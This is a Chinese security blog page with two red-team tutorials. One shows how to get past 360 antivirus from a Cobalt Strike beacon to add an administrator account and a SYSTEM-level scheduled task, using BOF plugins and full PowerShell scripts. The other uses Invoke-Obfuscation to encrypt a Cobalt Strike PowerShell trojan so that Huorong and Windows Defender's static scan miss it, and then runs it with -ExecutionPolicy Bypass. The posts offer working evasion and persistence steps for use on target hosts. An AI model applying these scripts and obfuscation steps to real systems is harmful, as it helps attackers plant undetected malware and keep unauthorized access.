<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Chensicha‘s blogs">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Chensicha‘s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Xiao Ni">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Chensicha‘s blogs</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Chensicha‘s blogs</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-留言">

    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通常情况下直接执行cmd命令来添加用户或者计划任务都会被杀软拦截，我总结两种方法来绕过杀软的检测，分别是调用Windows Api(编写CS bof)或者执行Powershell脚本(通过模拟powershell环境的程序来执行)</p>
<h1 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h1><h2 id="拦截情景"><a href="#拦截情景" class="headerlink" title="拦截情景"></a>拦截情景</h2><p>在开启360核晶模式的环境下，在UI界面执行添加用户的命令都会被拦截</p>
<img src="绕杀软添加计划任务/image-20230719165242670.png" alt="image-20230719165242670" style="zoom:67%;" />	



<p>更别说是在beacon命令行界面执行添加用户命令了，这里我分别尝试使用shell命令和run命令来添加用户，均被核晶拦截了</p>
<blockquote>
<p><code>shell</code>命令：此命令允许你执行Windows命令提示符（cmd.exe）中的任何命令。执行的命令将在命令提示符中运行，并将其输出返回给CobaltStrike。这是一个交互式命令，意味着你可以在输出返回后立即输入下一个命令</p>
<p><code>run</code>命令：此命令用于在新的进程中运行程序或命令。与<code>shell</code>命令不同，它只是启动新的进程并返回。</p>
</blockquote>
<img src="绕杀软添加计划任务/image-20230719172245374.png" alt="image-20230719172245374" style="zoom:67%;" />	

<img src="绕杀软添加计划任务/image-20230719172254551.png" alt="image-20230719172254551" style="zoom:67%;" />			



<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="1-CS-bof"><a href="#1-CS-bof" class="headerlink" title="1.CS bof"></a>1.CS bof</h3><p>在Windows API中，有一些函数用于处理网络用户和本地组的管理。<code>NetUserAdd()</code> 函数用于在一个服务器上创建一个新用户，而 <code>NetLocalGroupAdd()</code> 函数可以用于在一个本地服务器上创建一个新的用户组</p>
<p>此CS插件整合了添加用户的API，并通过反射dll注入的方式实现无文件落地执行，github项目地址：<a target="_blank" rel="noopener" href="https://github.com/crisprss/BypassUserAdd">https://github.com/crisprss/BypassUserAdd</a></p>
<p>首先确定beacon进程拥有system权限，这里我使用此插件添加用户的第一个方法<code>Reflection NetUserAdd</code>，随后输入添加用户名及密码</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719173255080.png" alt="image-20230719173255080">		</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719173506171.png" alt="image-20230719173506171">	</p>
<p>运行成功后在beacon命令行会提示</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719173601290.png" alt="image-20230719173601290"></p>
<p>核晶全程没有查杀，cmd命令行输入<code>net user</code>可以发现user4用户添加成功了</p>
<img src="绕杀软添加计划任务/image-20230719173723893.png" alt="image-20230719173723893" style="zoom:67%;" />



<h3 id="2-Powershell脚本"><a href="#2-Powershell脚本" class="headerlink" title="2.Powershell脚本"></a>2.Powershell脚本</h3><p>以下是添加用户的Powershell脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用管理员权限运行此脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义新用户的用户名和密码</span></span><br><span class="line"><span class="variable">$userName</span> = <span class="string">&quot;NewUser&quot;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Password123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建本地用户账户</span></span><br><span class="line"><span class="built_in">New-LocalUser</span> <span class="literal">-Name</span> <span class="variable">$userName</span> <span class="literal">-Password</span> <span class="variable">$password</span> <span class="literal">-FullName</span> <span class="string">&quot;New User&quot;</span> <span class="literal">-Description</span> <span class="string">&quot;This is a new user.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加新用户到 &quot;Users&quot; 组</span></span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Administrators&quot;</span> <span class="literal">-Member</span> <span class="variable">$userName</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出创建的用户信息</span></span><br><span class="line"><span class="built_in">Get-LocalUser</span> <span class="literal">-Name</span> <span class="variable">$userName</span></span><br></pre></td></tr></table></figure>



<p>以下是执行powershell脚本的效果图：</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230721145437347.png" alt="image-20230721145437347"></p>
<p>​	</p>
<h1 id="添加计划任务"><a href="#添加计划任务" class="headerlink" title="添加计划任务"></a>添加计划任务</h1><h2 id="拦截情景-1"><a href="#拦截情景-1" class="headerlink" title="拦截情景"></a>拦截情景</h2><p>beacon命令行执行shell命令来添加计划任务，直接被核晶拦截</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;My Task&quot; /tr &quot;C:\MyApp.exe&quot; /sc daily /st 10:00</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719204529199.png" alt="image-20230719204529199"></p>
<h2 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="1-CS-bof-1"><a href="#1-CS-bof-1" class="headerlink" title="1.CS bof"></a>1.CS bof</h3><p>在Windows api中，你可以使用 Task Scheduler （任务计划程序）API 来创建和管理计划任务。任务计划程序 API 是一组 COM 接口，你可以通过各种编程语言（如 C++，C#，VBScript 等）来使用它</p>
<p>CobaltStrike有个叫Bof的功能，它允许你使用C语言来扩展Beacon的功能，运行时可以直接加载到内存中并执行，因此可以通过编写创建计划任务的bof来绕过一些杀软的检测	此处github上有现成的项目：<a target="_blank" rel="noopener" href="https://github.com/yanghaoi/CobaltStrike_CNA">https://github.com/yanghaoi/CobaltStrike_CNA</a>	</p>
<p>加载github项目的插件后，鼠标右键上线会话，<code>Persistence</code>-&gt;<code>计划任务</code>-&gt;<code>Add-TaskAPI</code>, 通过调用Windows API来添加计划任务</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719212549620.png" alt="image-20230719212549620"></p>
<p>设置添加计划任务的详细信息</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719212712261.png" alt="image-20230719212712261">	</p>
<p>添加计划任务后, 会在Beacon命令行提示任务创建成功</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230719212734715.png" alt="image-20230719212734715"></p>
<p>查看目标主机的计划任务列表，可以看到计划任务添加成功了，并且360核晶全程没有报毒</p>
<img src="绕杀软添加计划任务/image-20230719212935726.png" alt="image-20230719212935726" style="zoom:67%;" />	



<h3 id="2-PowerShell脚本"><a href="#2-PowerShell脚本" class="headerlink" title="2.PowerShell脚本"></a>2.PowerShell脚本</h3><p>配合模拟powershell环境的可执行程序执行ps1脚本，以此实现添加计划任务，如下是添加计划任务的ps1脚本代码</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义任务的名称、要运行的程序和参数、描述信息</span></span><br><span class="line"><span class="variable">$taskName</span> = <span class="string">&quot;\Explorer\test1&quot;</span></span><br><span class="line"><span class="variable">$programPath</span> = <span class="string">&quot;C:\Path\To\Your\Program\MyProgram.exe&quot;</span></span><br><span class="line"><span class="variable">$programArgs</span> = <span class="string">&quot;base64&quot;</span></span><br><span class="line"><span class="variable">$taskDescription</span> = <span class="string">&quot;This is a scheduled task running a program daily at 12:00 PM.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果任务已经存在，先删除</span></span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.TaskName <span class="operator">-eq</span> <span class="variable">$taskName</span> &#125;) <span class="operator">-ne</span> <span class="variable">$null</span>) &#123;</span><br><span class="line">    <span class="built_in">Unregister-ScheduledTask</span> <span class="literal">-TaskName</span> <span class="variable">$taskName</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定触发器</span></span><br><span class="line"><span class="variable">$trigger</span> = <span class="built_in">New-ScheduledTaskTrigger</span> <span class="literal">-Daily</span> <span class="literal">-At</span> <span class="number">17</span>:<span class="number">56</span>pm  <span class="comment">#在每天的12:00 PM运行任务</span></span><br><span class="line"><span class="comment">#$trigger = New-ScheduledTaskTrigger -AtStartup       #在每次启动时运行任务</span></span><br><span class="line"><span class="comment">#$trigger = New-ScheduledTaskTrigger -AtIdle          #在系统空闲时运行任务 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定任务的操作，即要运行的程序和参数</span></span><br><span class="line"><span class="variable">$action</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-Execute</span> <span class="variable">$programPath</span> <span class="literal">-Argument</span> <span class="variable">$programArgs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个以系统权限运行的计划任务</span></span><br><span class="line"><span class="variable">$principal</span> = <span class="built_in">New-ScheduledTaskPrincipal</span> <span class="literal">-UserID</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="literal">-LogonType</span> ServiceAccount <span class="literal">-RunLevel</span> Highest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建计划任务</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-TaskName</span> <span class="variable">$taskName</span> <span class="literal">-Trigger</span> <span class="variable">$trigger</span> <span class="literal">-Action</span> <span class="variable">$action</span> <span class="literal">-Principal</span> <span class="variable">$principal</span> <span class="literal">-Description</span> <span class="variable">$taskDescription</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的计划任务</span></span><br><span class="line"><span class="comment"># $taskToDelete = &quot;\Explorer\test2&quot;</span></span><br><span class="line"><span class="comment"># if((Get-ScheduledTask | Where-Object &#123; $_.TaskName -eq $taskToDelete &#125;) -ne $null) &#123;</span></span><br><span class="line">    <span class="comment"># Unregister-ScheduledTask -TaskName $taskToDelete -Confirm:$false</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br></pre></td></tr></table></figure>



<p>运行效果如下图所示：</p>
<p><img src="/%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/image-20230721150156077.png" alt="image-20230721150156077">						</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
      <meta itemprop="name" content="Xiao Ni">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chensicha‘s blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/29/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Invoke-Obfuscation工具下载地址: <a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
<p>这是一款针对<code>PowerShell</code>文件的免杀工具, 此处对CS生成的PowerShell木马进行免杀</p>
<p>Invoke-Obfuscation是一款PowerShell混淆工具，可以将PowerShell脚本加密，使得它的检测和分析变得更加困难。该工具包含多种加密方法，可以单独使用也可以结合使用，以提高混淆的效果。Invoke-Obfuscation还有多个选项可以选择，如TOKEN、AST、STRING、ENCODING、COMPRESS和LAUNCHER，可以帮助你更好地混淆脚本</p>
<h2 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h2><h3 id="1-CS生成ps木马"><a href="#1-CS生成ps木马" class="headerlink" title="1.CS生成ps木马"></a>1.CS生成ps木马</h3><p>打开Cobalt Strike, 点击<code>攻击&gt;生成后门-&gt;Payload Generator</code></p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191819966.png" alt="image-20230106191819966">			</p>
<p>选择相应的监听, 生成<code>powershell</code>木马</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191957575.png" alt="image-20230106191957575">	</p>
<h3 id="2-导入模块并加载"><a href="#2-导入模块并加载" class="headerlink" title="2.导入模块并加载"></a>2.导入模块并加载</h3><p>进入<code>invoke-Obsfuscation</code>文件夹并打开powershell, 执行如下命令导入<code>Invoke-Obfuscation</code>模块</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br></pre></td></tr></table></figure>



<p>执行如下命令加载模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106192850710.png" alt="image-20230106192850710"></p>
<p>随后进入工具命令行界面, 如下图所示, 该工具支持六种加密方式:</p>
<ul>
<li><p>TOKEN: 将脚本转换为一个或多个PowerShell解析器令牌的序列</p>
</li>
<li><p>AST: 将脚本转换为抽象语法树</p>
</li>
<li><p>STRING: 混淆脚本中的字符串，使得脚本的意图变得模糊不清</p>
</li>
<li><p>ENCONDING: 将脚本转换为ASCII、Unicode或Base64编码</p>
</li>
<li><p>COMPRESS: 将脚本压缩，使得脚本的大小变小，从而使得脚本的传输和存储更加方便</p>
</li>
<li><p>LAUNCHER: 生成一个启动器，该启动器可以在目标系统上执行混淆后的脚本</p>
</li>
</ul>
<img src="木马免杀之工具篇/image-20230106192908168.png" alt="image-20230106192908168" style="zoom:67%;" />	



<h3 id="3-输入要加密的脚本路径"><a href="#3-输入要加密的脚本路径" class="headerlink" title="3.输入要加密的脚本路径"></a>3.输入要加密的脚本路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set scriptpath C:\Users\hacker\Desktop\payload.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220244166.png" alt="image-20230106220244166">	</p>
<h3 id="4-加密脚本"><a href="#4-加密脚本" class="headerlink" title="4.加密脚本"></a>4.加密脚本</h3><p>此次我选择编码加密, 输入<code>encoding</code>, 随后出现8种编码加密方式, 这里我简单介绍下常用的五种加密</p>
<ol>
<li>ASCII编码</li>
<li>HEX(16进制)编码</li>
<li>octal(8进制)编码</li>
<li>Binary(2进制)编码</li>
<li>AES算法加密(最常用)</li>
</ol>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220433823.png" alt="image-20230106220433823">	</p>
<p>此处我选择5, 即AES算法加密</p>
<img src="木马免杀之工具篇/image-20230106221309176.png" alt="image-20230106221309176" style="zoom:67%;" />		



<p>输入<code>back</code>返回上级目录, 然后输入<code>string</code>对脚本文件进行字符串混肴, 有三种字符串混肴方法, 此处我输入2选择了第二种</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106222848097.png" alt="image-20230106222848097">	</p>
<h3 id="5-查看加密选项"><a href="#5-查看加密选项" class="headerlink" title="5.查看加密选项"></a>5.查看加密选项</h3><p>可以看到加密前和加密后的脚本内容对比, 以及采用了何种加密方法和完整的加密命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223901101.png" alt="image-20230106223901101">	</p>
<h3 id="6-输出脚本"><a href="#6-输出脚本" class="headerlink" title="6.输出脚本"></a>6.输出脚本</h3><p>输出加密后的脚本文件至工具目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out test.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106221539461.png" alt="image-20230106221539461"></p>
<h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><h3 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h3><p>使用火绒静态扫描脚本文件, 没有发现威胁</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223945754.png" alt="image-20230106223945754">	</p>
<p>cmd命令行输入如下命令执行脚本, 火绒没有报毒, 成功过掉火绒动态扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>至于为何要加上<code>-ExecutionPolicy Bypass</code>参数, 这是因为在默认情况下, powershell的安全策略规定不允许运行命令和文件, 但是可以通过添加此参数来绕过任意一个安全保护规则, 在真实的渗透环境中经常用到此参数来执行powershell脚本</p>
</blockquote>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224136701.png" alt="image-20230106224136701">	</p>
<h3 id="WindowDefender"><a href="#WindowDefender" class="headerlink" title="WindowDefender"></a>WindowDefender</h3><p>成功过掉WindowDefender的静态扫描</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224957853.png" alt="image-20230106224957853">	</p>
<p>但是过不了WindowDefender的动态扫描</p>
<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106225055133.png" alt="image-20230106225055133">	</p>
